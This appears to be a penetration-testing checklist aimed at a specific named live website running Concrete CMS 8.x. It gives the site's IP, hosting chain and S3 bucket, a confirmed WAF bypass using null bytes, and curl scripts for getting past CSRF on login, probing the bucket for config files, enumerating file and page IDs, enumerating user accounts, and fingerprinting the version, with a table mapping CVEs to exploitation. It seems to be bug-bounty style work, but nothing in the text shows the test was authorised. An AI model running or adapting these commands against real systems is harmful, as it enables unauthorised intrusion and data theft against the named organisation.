# jobs.dnv.com - Concrete CMS v8.x Testing Checklist

**Target:** jobs.dnv.com
**CMS:** Concrete CMS v8.x (jQuery 1.12.2 confirms pre-8.5.4)
**Infrastructure:** Azure (IP: 20.113.80.110), hosted by ThirtyThree LLP
**WAF Bypass:** Null byte `%00` appended to URL bypasses 403
**Build Hash:** `ccm_nocache=b913f331f51601ace16ea59b115f6639a71c18e4`
**Page ID:** CCM_CID = 156
**Tools Path:** `/index.php/tools/required`

---

## Confirmed Findings

### 1. WAF Bypass via Null Byte Injection (Medium-High)
- `https://jobs.dnv.com/login/authenticate/concrete%00` bypasses 403 Forbidden
- `https://jobs.dnv.com/index.php/login%00` bypasses 403 Forbidden
- The WAF improperly handles null bytes, allowing access to protected endpoints

### 2. Outdated jQuery 1.12.2 (Medium)
- **CVE-2020-11022 / CVE-2020-11023** - XSS via `.html()` parsing untrusted HTML
- **CVE-2019-11358** - Prototype Pollution via `jQuery.extend(true, ...)`

### 3. End-of-Life Software (High - Informational)
- Concrete CMS 8.5.x security support ended Dec 2024
- Requires PHP 7 which has been EOL since Nov 28, 2022
- No further security patches will be issued

### 4. Broken SRI Integrity Attributes (Low-Medium)
- Favicon integrity attribute has trailing `%`: `integrity="sha256-...=%" `
- Subresource integrity is not actually protecting against tampered assets

---

## CSRF Token Fix (Login Authentication)

The "Invalid form token" error occurs because the POST URL with `%00` doesn't match the canonical action string used to generate the token.

```bash
# Step 1: GET login page (with null byte to bypass WAF), save cookies AND headers
curl -v -c cookies.txt -s "https://jobs.dnv.com/index.php/login%00" -o login_page.html 2>&1 | grep -i "set-cookie"

# Step 2: Extract the token
grep -oP 'name="ccm_token" value="\K[^"]+' login_page.html

# Step 3: POST to the CANONICAL URL (from the form action), same session
curl -v -b cookies.txt -X POST "https://jobs.dnv.com/login/authenticate/concrete" \
  -H "Referer: https://jobs.dnv.com/index.php/login" \
  -H "Origin: https://jobs.dnv.com" \
  -d "uName=test&uPassword=test&ccm_token=TOKEN_HERE"
```

### WAF Bypass Variants for POST (if canonical URL is blocked)
```bash
/login/authenticate/concrete%00
/login/authenticate/concrete%0a
/login/authenticate/concrete/.
/login/authenticate/./concrete
/login//authenticate//concrete
/login/authenticate/concrete;
/login/authenticate/concrete%23
/INDEX.PHP/login/authenticate/concrete
```

---

## Priority Tests

### 1. S3 Bucket Misconfiguration (Potentially Critical)

Exposed bucket: `33-cdn-image-handler.s3.eu-west-2.amazonaws.com/production/dnvvcare2301/`

```bash
# Check if bucket is publicly listable
curl "https://33-cdn-image-handler.s3.eu-west-2.amazonaws.com/"

# Check if you can list the production directory
curl "https://33-cdn-image-handler.s3.eu-west-2.amazonaws.com?prefix=production/dnvvcare2301/"

# Check for sensitive files
curl "https://33-cdn-image-handler.s3.eu-west-2.amazonaws.com/production/dnvvcare2301/application/config/database.php"
```

### 2. File Download IDOR (CVE-2021-22967) - Potentially High

```bash
# Enumerate file IDs for unauthenticated access to restricted files
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "fID=$i: %{http_code} %{size_download}bytes\n" \
    "https://jobs.dnv.com/index.php/download_file/view_inline/$i%00"
done
```

### 3. Conversation Attachment IDOR (CVE-2021-22967)

```bash
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/conversation/subscribe%00"
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/conversation/add_message%00"
```

### 4. System Info Disclosure

```bash
curl -s "https://jobs.dnv.com/index.php/ccm/system/dialogs/page/search%00"
curl -s "https://jobs.dnv.com/index.php/ccm/system/notification/list%00"
curl -s "https://jobs.dnv.com/index.php/dashboard/system/environment/info%00"
```

### 5. Tools Endpoint Enumeration

```bash
curl -s "https://jobs.dnv.com/index.php/tools/required/files/importers/remote%00"
curl -s "https://jobs.dnv.com/index.php/tools/required/files/approve%00"
curl -s "https://jobs.dnv.com/index.php/tools/required/conversations%00"
curl -s "https://jobs.dnv.com/index.php/tools/required/files/properties%00"
```

### 6. REST API Endpoints

```bash
curl -s "https://jobs.dnv.com/index.php/ccm/api/v1%00"
curl -s "https://jobs.dnv.com/ccm/api/v1/system/info%00"
```

### 7. Page ID Enumeration (IDOR)

```bash
for i in $(seq 1 200); do
  echo "--- Page $i ---"
  curl -s -o /dev/null -w "%{http_code}" "https://jobs.dnv.com/index.php?cID=$i%00"
done
```

### 8. Forgot Password User Enumeration

```bash
# First get a fresh token from login page
TOKEN=$(curl -c cookies.txt -s "https://jobs.dnv.com/index.php/login%00" | grep -oP 'name="ccm_token" value="\K[^"]+')

curl -b cookies.txt -X POST "https://jobs.dnv.com/login/concrete/forgot_password" \
  -d "uEmail=admin@dnv.com&ccm_token=$TOKEN"
```

---

## Version-Specific CVEs to Verify

| CVE | Severity | Description | Affected | Auth Required? |
|-----|----------|-------------|----------|---------------|
| CVE-2022-21829 | CVSS 8.0 | Zip download over HTTP -> RCE | <= 8.5.7 | Admin |
| CVE-2020-24986 | High | Unrestricted file upload -> RCE | < 8.5.3 | Admin |
| CVE-2022-30117 | Medium-High | Path traversal in `/index.php/ccm/system/file/upload` -> Arbitrary File Delete | <= 8.5.7 | Authenticated |
| CVE-2021-22967 | CVSS 4.3 | IDOR - unauthenticated file access via conversation attachments | < 8.5.7 | **No** |
| CVE-2021-22958 | High | Stored XSS to admin account takeover | < 8.5.5 | Low-priv |
| CVE-2024-8661 | CVSS 4.6 | Stored XSS in Next & Previous Nav block | < 8.5.19 | Admin |
| CVE-2024-8291 | CVSS 5.1 | Stored XSS in Image Editor Background Color | < 8.5.19 | Admin |
| CVE-2024-4350 | CVSS 5.1 | Stored XSS in RSS Displayer | < 8.5.18 | Admin |

---

## Version Fingerprinting

To determine the exact Concrete CMS version:

```bash
# Meta generator tag
curl -s "https://jobs.dnv.com/%00" | grep -i "generator"

# Config file
curl -s "https://jobs.dnv.com/concrete/config/concrete.php%00"

# Updates directory listing
curl -s "https://jobs.dnv.com/updates/%00"

# API schema (if REST API enabled)
curl -s "https://jobs.dnv.com/index.php/ccm/system/api/openapi.json%00"

# Match build hash b913f331f51601ace16ea59b115f6639a71c18e4 against
# https://github.com/concretecms/concretecms commits
```

---

## Infrastructure Notes

- **S3 Bucket:** `33-cdn-image-handler.s3.eu-west-2.amazonaws.com` (region: eu-west-2)
- **Client ID:** `dnvvcare2301`
- **CNAME Chain:** `jobs.dnv.com` -> `dnvvcare2301.thirtythreelive.co.uk` -> `webproduction-eu01.thirtythreelive.co.uk` (20.113.80.110)
- **Chatbot:** `chatbot.jobs.dnv.com` -> `dnv.phenompeople.net` -> CloudFront (403 Forbidden)
- **Theme:** ThirtyThree LLP custom theme at `/application/themes/thirty_three/`
- **CSP Nonce:** Per-request (e.g., `yKtLsoUGNt0AsnGhmgmtvzsK`)

---

## Report Priority

1. **S3 Bucket Misconfiguration** - if listable/writable = **Critical**
2. **WAF Bypass via Null Byte** - confirmed = **Medium-High**
3. **File Download IDOR** - if unauthenticated access to restricted files = **High**
4. **End-of-Life Concrete CMS 8.x + PHP 7** - security support ended = **High (Informational)**
5. **jQuery 1.12.2 XSS + Prototype Pollution** - confirmed = **Medium**
6. **Broken SRI integrity attributes** - confirmed = **Low-Medium**
